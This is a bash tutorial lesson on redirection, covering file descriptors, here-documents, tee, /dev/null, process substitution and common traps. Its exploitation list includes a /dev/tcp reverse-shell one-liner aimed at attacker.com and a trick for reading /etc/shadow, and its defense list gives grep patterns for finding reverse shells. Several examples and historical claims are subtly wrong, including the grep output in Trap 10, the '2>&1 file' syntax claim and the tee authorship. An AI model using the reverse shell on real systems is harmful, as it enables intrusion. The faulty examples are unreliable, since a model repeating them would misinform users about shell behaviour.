# Lesson 6: Redirection Deep Dive

## History & Origins

Redirection is baked into Unix from the very beginning. The concept of file descriptors — numbered handles to open files — was part of the Unix design by Ken Thompson and Dennis Ritchie in the early 1970s. By convention, file descriptor 0 is standard input (stdin), 1 is standard output (stdout), and 2 is standard error (stderr).

The `>` and `<` operators appeared in the Bourne shell (1977), but the concept came from the earlier Thompson shell (1971) which used `>` for output redirection and `<` for input. The Bourne shell added `2>` for stderr redirection.

The order dependency of `2>&1 > file` vs `> file 2>&1` has been confusing users since day one. It's a quirk of how the shell processes redirections left to right.

The here-document (`<<`) operator was introduced in the Bourne shell, inspired by the interactive shell's ability to read multi-line input. The `<<` operator with a delimiter is originally from the "shell document" feature. The here-string (`<<<`) is a bash extension (introduced in bash 2.05b, 2002), providing a more convenient single-line input source. It was inspired by the `zsh` feature of the same name.

`tee` was written by Mike Parker and Richard Gunn in 1989 for GNU. The name comes from the T-splitter in plumbing — a pipe fitting that splits flow into two directions. The `tee` command does exactly that: splits a data stream to go to both a file and the stdout.

`/dev/null` — the "bit bucket" — dates back to Version 7 Unix (1979). It was created by the Unix developers as a way to discard output. Writing to it succeeds but the data is thrown away. Reading from it returns EOF immediately. On Linux, `/dev/null` is a character device (major 1, minor 3).

**Fun anecdote:** The phrase "bit bucket" predates Unix — it was used in the 1950s to describe the place where discarded bits went. `/dev/null` is often humorously called the "null device," and there's a saying: "If at first you don't succeed, redirect to /dev/null." There's also `/dev/null` themed merchandise and the term "null routing" (sending network traffic to a black hole) is directly inspired by it.

## Syntax Reference

### Basic File Redirection

```bash
> file              # Redirect stdout to file (overwrite)
>> file             # Redirect stdout to file (append)
< file              # Read stdin from file
<> file             # Open file for both reading and writing (rarely used)
```

### File Descriptor Redirection

```bash
n> file             # Redirect file descriptor n to file (overwrite)
n>> file            # Redirect file descriptor n to file (append)
n< file             # Read file descriptor n from file
n>&m                # Redirect fd n to same place as fd m (duplicate)
n<&m                # Duplicate input fd m to fd n
n>&-                # Close file descriptor n
n<&-                # Close input file descriptor n
```

The common descriptors: `1` = stdout, `2` = stderr.

### Combined Redirections

```bash
&> file             # Redirect both stdout and stderr to file (bashism)
>& file             # Same as &> (older bashism)
> file 2>&1         # Redirect stdout to file, then stderr to stdout (POSIX)
>> file 2>&1        # Append both
2>&1 | cmd          # Pipe both stdout and stderr (before pipe)
|& cmd              # Pipe both stdout and stderr (bash 4.0+, simplified)
```

### Here-Documents

```bash
<< EOF             # Here-document with delimiter EOF
... text ...
EOF

<< 'EOF'           # Quoted delimiter — no expansion inside
... $HOME stays literal ...
EOF

<<- EOF            # Leading tabs STRIPPED (not spaces)
	... indented text ...
EOF
```

### Here-Strings

```bash
<<< "string"       # Feed string as stdin to command
<<< $variable      # Feed variable content as stdin
```

### Process Substitution (bash)

```bash
<(command)         # Run command, return its output as a filename (/dev/fd/N)
>(command)         # Run command, provide a filename to write to it

diff <(ls dir1) <(ls dir2)     # Compare two directory listings
command > >(tee log.txt)       # Redirect to process substitution
```

### Special Files

```bash
/dev/null           # Bit bucket — all data discarded, reads return EOF
/dev/zero           # Infinite null bytes (\0)
/dev/random         # Random bytes (blocks if entropy depleted)
/dev/urandom        # Random bytes (non-blocking PRNG)
/dev/fd/N           # Access file descriptor N as a file
/dev/stdin          # Synonym for /dev/fd/0
/dev/stdout         # Synonym for /dev/fd/1
/dev/stderr         # Synonym for /dev/fd/2
```

### `tee` — Split Output

```bash
tee [options] file...
```

| Flag | Long | What it does |
|------|------|-------------|
| `-a` | `--append` | Append to files, don't overwrite |
| `-i` | `--ignore-interrupts` | Ignore interrupt signals |

## Under the Hood

### What happens during `> file`

1. Shell calls `open("file", O_WRONLY|O_CREAT|O_TRUNC, 0666)`.
2. If file doesn't exist, it's created (subject to umask).
3. If file exists, it's truncated to zero length.
4. The returned file descriptor replaces fd 1 (stdout) in the child process's fd table.
5. The command runs with its stdout connected to the file.
6. After the command, the shell restores its own stdout (which was saved before forking).

### What happens during `2>&1`

1. The shell calls `dup2(1, 2)` — this copies fd 1 (stdout) to fd 2 (stderr).
2. After this, both fd 1 and fd 2 refer to the same kernel file descriptor structure.
3. The order matters: `> file 2>&1`:
   - First: `open("file", ...)` -> fd 1 points to file.
   - Then: `dup2(1, 2)` -> fd 2 now points to the same file.
4. But `2>&1 > file`:
   - First: `dup2(1, 2)` -> fd 2 points to whatever fd 1 currently points to (usually the terminal).
   - Then: `open("file", ...)` -> fd 1 now points to the file, but fd 2 still points to the terminal.

### The complete stderr-redirection-to-file flow

```bash
cmd > file 2>&1
```

Translated to syscalls:
```
fork() -> child process (shell saves parent fds)
  in child:
    fd1 = open("file", O_WRONLY|O_CREAT|O_TRUNC, 0666)  # fd 1 = file
    dup2(1, 2)                                            # fd 2 = same as fd 1
    execve("cmd", ...)                                     # cmd runs with both fds = file
  parent:
    waitpid(child)                                         # wait for cmd
    # shell's fds are unchanged (it saved/restored them)
```

### What happens during `<<< "string"`

1. Shell creates a temporary file (or pipe) containing "string\n".
2. The file descriptor is set as stdin (fd 0) for the command.
3. After the command, the temporary file is deleted.

With bash, here-strings are implemented using pipes:
```
pipe()[2] -> write "string\n" to write end, close it
dup2(read_end, 0) -> set read end as stdin
execve(cmd)
```

### What happens during `tee`

1. `tee` reads from stdin (fd 0) in a loop.
2. It opens all specified files for writing.
3. For each chunk read, it writes to all files AND to stdout.
4. This is a simple read/write loop:

```
while (n = read(0, buf, 8192)) > 0:
    write(1, buf, n)      # stdout
    for each file:
        write(fd, buf, n) # file
```

### Kernel-level details of `/dev/null`

- Device major 1, minor 3.
- `open("/dev/null")` always succeeds.
- `write()` returns the number of bytes "written" (actually discarded).
- `read()` returns 0 (EOF) immediately.
- `stat()` shows size 0, permissions `crw-rw-rw-`.

### The exec family and redirection

The shell's `exec` builtin can manipulate file descriptors without running a new command:

```bash
exec > /tmp/log.txt      # Redirect ALL subsequent stdout to file
echo "this goes to file"
exec > /dev/tty          # Restore stdout to terminal
```

Use `exec N>&-` to close file descriptor N. Use `exec N< file` to open a file as fd N for reading.

## Core Examples

### Example 1: Basic stdout redirection

```bash
$ ls /usr/bin > /tmp/bin_list.txt
$ wc -l /tmp/bin_list.txt
2560 /tmp/bin_list.txt
```

**Step by step:**
1. Shell forks child.
2. Child opens `/tmp/bin_list.txt` for writing (creates/truncates).
3. Child's fd 1 (stdout) now points to the file.
4. Child execs `ls /usr/bin` — `ls` writes its output to fd 1 (the file).
5. `ls` exits, shell reaps child, restores own stdout.
6. File contains the listing.

**What if:**
```bash
$ > /tmp/empty.txt            # Create empty file (no command)
$ > /tmp/truncated.txt < /tmp/existing.txt  # Truncate existing.txt and copy... wait
# Actually this just opens existing.txt for reading and truncated.txt for writing
# with no command between — nothing gets copied.
```

### Example 2: Append vs overwrite

```bash
$ echo "line 1" > /tmp/log.txt
$ echo "line 2" > /tmp/log.txt
$ echo "line 3" >> /tmp/log.txt
$ cat /tmp/log.txt
line 2        # line 1 is gone!
line 3
```

**Step by step:**
1. First `>` creates file with "line 1\n".
2. Second `>` truncates and rewrites with "line 2\n". "line 1" is gone.
3. `>>` appends "line 3\n" without truncating. File now has "line 2\nline 3\n".

**What if:**
```bash
$ echo "first" > /tmp/log.txt
$ echo "second" > /tmp/log.txt    # Oops, overwrote!
$ echo "third" >> /tmp/log.txt
```

### Example 3: Separate stdout and stderr

```bash
$ find /root -name "*.conf" > /tmp/find_out.txt 2> /tmp/find_err.txt
$ cat /tmp/find_err.txt
find: '/root': Permission denied
$ cat /tmp/find_out.txt
# Empty (nothing was found that was readable)
```

**Step by step:**
1. `find` starts, searches `/root`.
2. Permission denied messages are written to fd 2 (stderr) -> `/tmp/find_err.txt`.
3. Any normal output goes to fd 1 (stdout) -> `/tmp/find_out.txt`.
4. In this case, no files are readable in `/root`, so `find_out.txt` is empty.

**What if:**
```bash
$ find /root -name "*.conf" > /tmp/both.txt 2>&1    # Combined
$ find /root -name "*.conf" &> /tmp/both.txt         # Same (bashism)
$ find /root -name "*.conf" 2>&1 | grep -i permission  # Pipe both streams
```

### Example 4: The redirect order trap

```bash
$ find /root -name "*.conf" 2>&1 > /tmp/output.txt
# stderr goes to TERMINAL (it was duplicated to terminal's fd 1 before > changed fd 1)
# stdout goes to /tmp/output.txt
```

**Step by step:**
1. Shell processes redirections left to right.
2. `2>&1`: fd 2 = where fd 1 currently points (terminal). Now both point to terminal.
3. `> /tmp/output.txt`: fd 1 now points to file.
4. Result: stderr -> terminal (from step 2), stdout -> file (from step 3).
5. This is probably NOT what you wanted.

**Fix:**
```bash
$ find /root -name "*.conf" > /tmp/output.txt 2>&1   # Correct order!
$ find /root -name "*.conf" &> /tmp/output.txt        # Simpler
```

### Example 5: Here-document for multi-line input

```bash
$ cat << EOF > /tmp/hello.txt
> Hello world
> This is a here-doc
> It preserves $HOME in double-quoted delimiter
> EOF
$ cat /tmp/hello.txt
Hello world
This is a here-doc
It preserves /home/phd in double-quoted delimiter
```

**Step by step:**
1. Shell reads lines until it finds `EOF` alone on a line.
2. All lines between `<< EOF` and `EOF` are collected.
3. Variable expansion happens (`$HOME` is replaced).
4. The expanded text is passed as stdin to `cat`.
5. `cat` writes to `/tmp/hello.txt` via `>` redirect.

**What if:**
```bash
$ cat << 'EOF' > /tmp/literal.txt
> HOME is $HOME
> EOF
$ cat /tmp/literal.txt
HOME is $HOME    # Literal $HOME!
```

### Example 6: Here-string for single-line input

```bash
$ grep "root" <<< "root:x:0:0:root"
root:x:0:0:root
$ bc <<< "2+2"
4
$ tr 'a-z' 'A-Z' <<< "hello world"
HELLO WORLD
```

**Step by step:**
1. Shell takes the string after `<<<`.
2. Creates a pipe (or temp file) with the string + newline.
3. Sets the pipe's read end as stdin for the command.
4. Runs the command. It reads from stdin as if from a file.

**What if:**
```bash
$ read -r line <<< "Hello, World!"
$ echo "$line"
Hello, World!
$ # This avoids the pipeline subshell issue:
$ echo "Hello" | read var; echo "$var"   # Empty — read ran in subshell!
```

### Example 7: tee for split output

```bash
$ ls /etc/*.conf | tee /tmp/confs.txt | wc -l
28
$ cat /tmp/confs.txt
/etc/adduser.conf
/etc/debconf.conf
...
```

**Step by step:**
1. `ls /etc/*.conf` outputs filenames to stdout.
2. Pipe connects stdout to `tee`'s stdin.
3. `tee` reads the list, writes it to `/tmp/confs.txt`.
4. `tee` ALSO writes the list to its own stdout.
5. Pipe connects tee's stdout to `wc -l`.
6. `wc -l` counts the lines and outputs just the number.

**What if:**
```bash
$ ls /etc/*.conf | tee -a /tmp/confs.txt | wc -l   # Append mode
$ ls /etc/*.conf | tee /tmp/confs.txt /tmp/copy.txt | wc -l  # Multiple files
$ ls /etc/*.conf | tee /dev/null | wc -l   # tee to /dev/null (just for side effect)
$ ls /etc/*.conf | tee >(grep adduser) >(grep host) > /dev/null  # With process substitution
```

### Example 8: Process substitution for diff

```bash
$ diff <(ls /usr/bin) <(ls /bin)
# Shows differences between /usr/bin and /bin listings
```

**Step by step:**
1. `<(ls /usr/bin)`: bash runs `ls /usr/bin` in a subshell, connects its stdout to a pipe.
2. The pipe's read end is made available as `/dev/fd/N` (or a named pipe).
3. `diff` receives two file paths (e.g., `/dev/fd/63` and `/dev/fd/62`).
4. `diff` opens and reads both pseudo-files, comparing their contents.

**What if:**
```bash
$ diff <(sort file1) <(sort file2)    # Compare sorted versions
$ while IFS= read -r line; do ... done < <(command)  # Read command output line by line
```

### Example 9: Discarding output

```bash
$ command > /dev/null 2>&1    # Silence everything
$ command &> /dev/null         # Same, bashism
$ command > /dev/null 2>&1     # POSIX-compliant
```

**Step by step:**
1. `> /dev/null` redirects stdout to the bit bucket.
2. `2>&1` redirects stderr to stdout (also the bit bucket).
3. All output vanishes. No screen clutter.
4. Used in scripts when you only care about the exit code.

**What if:**
```bash
$ command 2> /dev/null          # Hide errors only
$ command > /dev/null           # Hide normal output only, show errors
$ cmd1 > /dev/null && cmd2      # Run cmd1 silently, run cmd2 only if cmd1 succeeded
```

### Example 10: File descriptor gymnastics

```bash
$ exec 3> /tmp/third_fd.txt    # Open fd 3 for writing
$ echo "hello" >&3             # Write to fd 3
$ exec 3>&-                    # Close fd 3
$ cat /tmp/third_fd.txt
hello
```

**Step by step:**
1. `exec 3> file` opens the file and assigns it to fd 3 for the current shell.
2. All subsequent commands in this shell can write to `>&3`.
3. `exec 3>&-` closes fd 3.
4. This is useful in scripts for opening log files permanently.

**What if:**
```bash
$ exec 3< /etc/passwd          # Open for reading
$ head -3 <&3                  # Read first 3 lines via fd 3
$ exec 3<&-                    # Close
$ # Could also use:
$ exec 4> /tmp/log.txt 2>&4    # Both stdout and stderr to same file for all commands
```

### Example 11: Using /dev/random

```bash
$ head -c 16 /dev/urandom | xxd -p
4a7f2c8e9b1d3f5a0c2e6b8d1a4f7c3e
```

**Step by step:**
1. `/dev/urandom` provides random bytes (non-blocking, PRNG-based).
2. `head -c 16` reads just 16 bytes.
3. `xxd -p` formats them as plain hex.
4. Useful for generating passwords, tokens, session IDs.

**What if:**
```bash
$ dd if=/dev/zero of=/tmp/zeros bs=1M count=10   # Create 10MB of zeros
$ dd if=/dev/random of=/tmp/random bs=1K count=1  # 1KB of random data (may block!)
```

### Example 12: Multiple redirections combined

```bash
$ echo "start" > /tmp/multi.txt
$ (echo "subshell line"; ls /nonexistent) >> /tmp/multi.txt 2>&1
$ cat /tmp/multi.txt
start
subshell line
ls: cannot access '/nonexistent': No such file or directory
```

**Step by step:**
1. `echo "start" > /tmp/multi.txt` — creates file.
2. `( ... )` creates a subshell.
3. Inside subshell: `>> /tmp/multi.txt 2>&1` — stdout and stderr both append to file.
4. Both commands' output (normal and error) go to the file.

## Real-World Use Cases

### 1. FOR the OS — Administration

- **`cron job > /dev/null 2>&1`** — silence cron output (mailed to admin by default if non-empty).
- **`apt-get update > /tmp/apt.log 2>&1`** — log package updates.
- **`echo "server1" | tee -a /etc/hosts /etc/hostname`** — append to multiple files.
- **`(date; df -h; free -h) >> /var/log/system_report.log`** — log snapshot with timestamp.
- **`exec > >(tee -a /var/log/script.log) 2>&1`** — log entire script execution.

### 2. WITH the OS — Development

- **`build.sh 2>&1 | tee build.log`** — see build output AND save it.
- **`diff <(git diff HEAD) <(git diff --cached)`** — compare working tree vs staged changes.
- **`python3 -c "print('hello')" > /dev/null && echo "ok"`** — check if Python runs.
- **`mysql database < schema.sql`** — run SQL file against database.
- **`ssh user@host 'bash -s' < script.sh`** — run local script on remote host.

### 3. AGAINST the OS — Exploitation

- **`command 2>&1 | tee /tmp/captured_output`** — capture both output streams.
- **`(cmd; cmd2) > /tmp/output 2>&1 &`** — background a task with logged output.
- **`/dev/null as DoS`: `cmd < /dev/null** — run a command with no input (may hang if it needs stdin).
- **`exec 3</etc/shadow; cat <&3`** — if you can sneak an fd inheritance.
- **Using `/dev/tcp` in bash**: `exec 3<>/dev/tcp/attacker.com/4444; cat <&3 &` — reverse shell.

### 4. FOR DEFENSE — Detection & Auditing

- **Audit redirections in scripts**: Check for `>/dev/null 2>&1` that might hide errors.
- **Monitor open file descriptors**: `ls -la /proc/*/fd/` — see all open fds per process.
- **Check for leaked secrets**: `grep -r '>> /tmp/' scripts/` — find scripts that write to world-readable temp files.
- **Detect reverse shells**: `grep -r '/dev/tcp/' /home/` — find bash reverse shell patterns.

## Memory Aids

### Mnemonics

- **`>`** = arrow pointing TO the file. `>` sends output to the file.
- **`<`** = arrow pointing FROM the file. `<` reads input from the file.
- **`>>`** = arrow pointing TO the file with a second arrow — "add more."
- **`2>&1`** = "make fd 2 go to where fd 1 goes." Read it right-to-left: "1" then "2 to &."
- **`&>`** = "and" — both stdout AND stderr.
- **`<<`** = double arrow INTO the command — multi-line input.
- **`tee`** = T-pipe in plumbing. The T-joint splits flow.
- **`/dev/null`** = "null" = nothing = discard.

### The redirect order rule

> **"Right to left, read the descriptor, then the destination."**

For `> file 2>&1`:
1. Start: fd 1 = terminal, fd 2 = terminal.
2. `> file`: fd 1 = file.
3. `2>&1`: fd 2 = where fd 1 goes (file).

For `2>&1 > file`:
1. Start: fd 1 = terminal, fd 2 = terminal.
2. `2>&1`: fd 2 = where fd 1 goes (terminal, currently).
3. `> file`: fd 1 = file. But fd 2 is still pointing to terminal!

### Pattern hooks

- Silence all output: `cmd &> /dev/null` or `cmd > /dev/null 2>&1`
- Save both streams: `cmd > file 2>&1`
- Save stdout, watch stderr: `cmd > out.txt; echo "stderr below:"; cmd 2>&1 >/dev/null`
- Append with timestamp: `echo "---- $(date) ----" >> log.txt`
- Feed multi-line stdin: `cat << EOF | cmd`

### Common confusions

- **`> file 2>&1` vs `2>&1 > file`**: Order matters. Always put `> file` first.
- **`&>` vs `>&`**: Both bash-specific. `&>` is newer and clearer. Use it in bash scripts.
- **`>> file 2>&1` vs `&>> file`**: `&>>` is also a bashism for appending both.
- **`<<` vs `<<-`**: `<<-` strips leading TABS (not spaces). Useful in indented scripts.
- **`2>&1` vs `2>&1 file`**: The latter is a syntax error. You can't chain `2>&1` to a file. You need two separate redirects.
- **`< file` vs `<<< "string"`**: The first reads FROM a file. The second feeds a string. Different sources.

## Trap Vault

### Trap 1: Order of redirects

**Problem:** `2>&1 > file` doesn't redirect stderr to file.

**Example:**
```bash
$ find /root 2>&1 > /tmp/out.txt
# stderr still shows on terminal!
```

**Why:** Redirections are processed left to right. `2>&1` makes stderr go to where stdout currently points (terminal). Then `> /tmp/out.txt` makes stdout point to the file. Stderr is still going to the terminal.

**Fix:**
```bash
$ find /root > /tmp/out.txt 2>&1    # Correct order
$ find /root &> /tmp/out.txt        # Simpler
```

### Trap 2: `>` truncates without asking

**Problem:** `> file` irretrievably destroys the file contents.

**Example:**
```bash
$ echo "important data" > /tmp/data.txt
$ echo "oops" > /tmp/data.txt       # Gone! No "are you sure?"
```

**Why:** The shell truncates immediately upon opening for writing, before the command runs. By the time `echo "oops"` starts, the data is already gone.

**Fix:**
```bash
$ set -o noclobber          # Prevent > from overwriting existing files
$ echo "data" >| file       # Force overwrite even with noclobber
$ [ -f file ] && cp file file.bak       # Manual backup
```

### Trap 3: Here-document with unquoted delimiter expands variables

**Problem:** `$HOME` in a here-document gets expanded when you want it literal.

**Example:**
```bash
$ cat << EOF > /tmp/config.txt
PATH=$PATH:/custom/bin
EOF
$ cat /tmp/config.txt
PATH=/usr/local/bin:/usr/bin:/custom/bin    # Not what we wanted!
```

**Why:** The shell expands variables in here-documents by default. Only quoting the delimiter prevents expansion.

**Fix:**
```bash
$ cat << 'EOF' > /tmp/config.txt
PATH=$PATH:/custom/bin
EOF
$ cat /tmp/config.txt
PATH=$PATH:/custom/bin
```

### Trap 4: `tee` overwrites by default

**Problem:** `tee` without `-a` overwrites the file.

**Example:**
```bash
$ echo "first" > /tmp/teed.txt
$ echo "second" | tee /tmp/teed.txt   # Overwrites!
second
$ cat /tmp/teed.txt
second
```

**Why:** `tee` by default opens its output files with `O_TRUNC` (truncate), same as `>`.

**Fix:**
```bash
$ echo "third" | tee -a /tmp/teed.txt  # Append
third
$ cat /tmp/teed.txt
second
third
```

### Trap 5: Process substitution vs pipes with variable scope

**Problem:** Variables set inside process substitution are lost after.

**Example:**
```bash
$ echo hello | read var; echo "$var"    # Empty!
$ read var <<< "hello"; echo "$var"     # Works
hello
```

**Why:** Both pipes and process substitution create subshells. Variables set in subshells don't propagate to the parent.

**Fix:** Use here-strings when possible, or use `{ read -r var; } < <(command)` in bash:
```bash
$ { read -r var; } < <(echo "hello"); echo "$var"
hello
```

### Trap 6: `/dev/null` is not for everything

**Problem:** Some commands detect `/dev/null` and change behavior.

**Example:**
```bash
$ ssh -o BatchMode=yes host command > /dev/null 2>&1
# SSH still might detect non-TTY and skip password prompt differently
# But more commonly: `crontab -l > /dev/null` — crontab doesn't write to stdout!
```

**Fix:** Understand what the command actually outputs. Some commands write only to stderr, some use special fds. `ssh -v` writes debugging to stderr.

### Trap 7: `exec > file` redirects all subsequent commands

**Problem:** After `exec > file`, everything goes to the file — including your prompt.

**Example:**
```bash
$ exec > /tmp/log.txt
$ echo "this goes to file"
$ ls /tmp                         # Also goes to file!
$ exec > /dev/tty                 # Restore (if you know the TTY)
```

**Why:** `exec` without a command just manipulates file descriptors for the current shell. `exec > file` makes ALL subsequent stdout go to the file.

**Fix:** Use subshells for temporary redirection:
```bash
$ (echo "this goes to file") > /tmp/log.txt
$ echo "this goes to terminal"
```

### Trap 8: Appending to a symlink

**Problem:** `>> symlink` follows the symlink and appends to the target.

**Example:**
```bash
$ echo "original" > /tmp/target.txt
$ ln -s /tmp/target.txt /tmp/link.txt
$ echo "appended" >> /tmp/link.txt
$ cat /tmp/target.txt
original
appended
$ cat /tmp/link.txt
original
appended
```

**Why:** The kernel follows symlinks when opening files. `>> /tmp/link.txt` opens `/tmp/target.txt` and appends to it. This is usually what you want, but can be surprising if you expected the symlink itself to be modified.

**Fix:** To operate on the symlink itself, use `readlink` or `ln -sf` (to replace the link). You can't append to a symlink's content — symlinks contain only a path string.

### Trap 9: Here-doc with leading whitespace

**Problem:** `<<` respects leading whitespace. `<<-` only strips tabs, not spaces.

**Example:**
```bash
$ if true; then
> cat << EOF
>     indented text
> EOF
> fi
    indented text    # Preserves the 4 spaces
```

**Fix:**
```bash
$ if true; then
> cat <<- EOF
> 	indented text    # Must use TAB, not spaces!
> EOF
> fi
indented text        # Tab stripped
```

### Trap 10: Reading from both stdin and arguments

**Problem:** `cat file | cmd file2` — the pipe doesn't feed stdin because cmd reads from file2.

**Example:**
```bash
$ cat /etc/hosts | grep "localhost"
127.0.0.1    localhost    # Works: grep reads from pipe
$ cat /etc/hosts | grep "localhost" /etc/hosts
127.0.0.1    localhost    # grep reads from /etc/hosts, NOT the pipe!
127.0.0.1    localhost    # Same line twice? Yes, because both sources matched.
```

**Why:** When a command is given a filename argument, it reads from the file, not from stdin. The pipe data is ignored (or read by another instance).

**Fix:** Use `-` to explicitly read from stdin: `cat /etc/hosts | grep "localhost" -` reads from both. Or use `grep "localhost"` without filename to read stdin.

## See It In The Wild

### Where you encounter redirection daily

- **`~/.bashrc`** — redirects like `source ~/.bashrc` don't use redirects directly, but many aliases do.
- **`crontab -e`** — cron jobs commonly silence output with `> /dev/null 2>&1`.
- **`systemd service files`** — `StandardOutput=` and `StandardError=` directives control where services write.
- **Docker**: `docker run ... > /dev/null 2>&1` to detach.
- **`nohup command &`** — creates `nohup.out` by redirecting stdout.

### How to observe redirection with strace

```bash
# Watch how > truncates
$ strace -e trace=openat,dup2 bash -c 'echo hello > /tmp/test_redir' 2>&1
...
openat(AT_FDCWD, "/tmp/test_redir", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3
dup2(3, 1) = 1
...

# Watch pipe creation for <<<
$ strace -e trace=pipe2,write,dup2 bash -c 'cat <<< "hello"' 2>&1
...
pipe2([3, 4], O_CLOEXEC) = 0
write(4, "hello\n", 6) = 6
dup2(3, 0) = 0
...
```

### Try this now

```bash
# Watch what happens to file descriptors with lsof
bash -c 'sleep 30' &
lsof -p $! | grep -E 'cwd|txt|0u|1u|2u'

# Count your file descriptor limit
ulimit -n

# Open a file descriptor and observe it
exec 5> /tmp/fd5_test
ls -la /proc/$$/fd/5
exec 5>&-
```

## Check Your Understanding

<details>
<summary>1. Why does `> file 2>&1` work but `2>&1 > file` doesn't for redirecting both to a file?</summary>

Redirections are processed left-to-right. `> file 2>&1`: stdout goes to file, then stderr goes to where stdout is (file). `2>&1 > file`: stderr goes to where stdout WAS (terminal), then stdout goes to file — stderr still goes to terminal.
</details>

<details>
<summary>2. What's the difference between `cat << EOF` and `cat << 'EOF'`?</summary>

`<< EOF` performs variable expansion and command substitution inside the here-document. `<< 'EOF'` (quoted delimiter) passes everything literally — `$HOME` stays `$HOME`, backticks are not interpreted.
</details>

<details>
<summary>3. What does `tee /dev/null` do? Why would you use it?</summary>

`tee /dev/null` writes stdout to `/dev/null` while also passing it through. This is useful when you want to ensure a command's output is fully consumed (forcing it to produce all output) while also piping it elsewhere. It's also used to force pipe buffering behavior in some cases.
</details>

<details>
<summary>4. How would you redirect both stdout and stderr to a file AND show them on screen?</summary>

Use `command 2>&1 | tee file.txt`. The pipe captures both streams (after `2>&1` merges them), `tee` writes to the file and passes through to stdout.
</details>

<details>
<summary>5. What does `exec 3>&1` do? When would you use it?</summary>

It makes file descriptor 3 point to where fd 1 (stdout) currently points. This "saves" stdout so you can restore it later. Pattern: `exec 3>&1; exec > file; echo "to file"; exec >&3; echo "to terminal"`. This saves stdout, redirects to file, then restores.
</details>

<details>
<summary>6. What shell option prevents accidental file overwrite with `>`?</summary>

`set -o noclobber`. When set, `> file` fails if `file` exists. You can override with `>| file`. Unset with `set +o noclobber`.
</details>

<details>
<summary>7. Why might `cmd < /dev/null` be necessary for some background processes?</summary>

Some commands read from stdin even when they don't need input. If stdin is a pipe that's closed, they might get EOF and exit. If stdin is a terminal, they might hang waiting for input. `cmd < /dev/null` gives them immediate EOF, ensuring they don't hang.
</details>
